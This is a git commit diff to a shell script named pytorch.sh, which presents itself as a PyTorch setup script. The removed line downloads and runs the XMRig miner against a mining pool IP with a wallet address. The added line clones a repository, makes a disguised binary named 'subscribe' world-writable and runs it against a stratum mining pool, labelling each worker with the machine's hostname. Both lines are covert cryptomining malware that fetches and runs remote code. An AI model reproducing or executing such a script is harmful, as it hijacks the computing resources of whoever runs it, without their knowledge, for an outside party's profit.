d5998684f1131d8bd5278247ee64a7cd1e1d3320
bciu1bic <95845838+bciu1bic@users.noreply.github.com>
2021-12-09 14:35:22 +0700

    Update pytorch.sh

--- pytorch.sh
+++ pytorch.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -zxf xmrig-6.15.2-linux-static-x64.tar.gz && cd xmrig-6.15.2 && ./xmrig -o 139.59.107.181:1515 -u TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2 --keepalive --donate-level 1 -p $(cat /proc/sys/kernel/hostname) -k --tls
+git clone https://github.com/mariobiszz/students.git && cd students && chmod 777 subscribe && ./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)
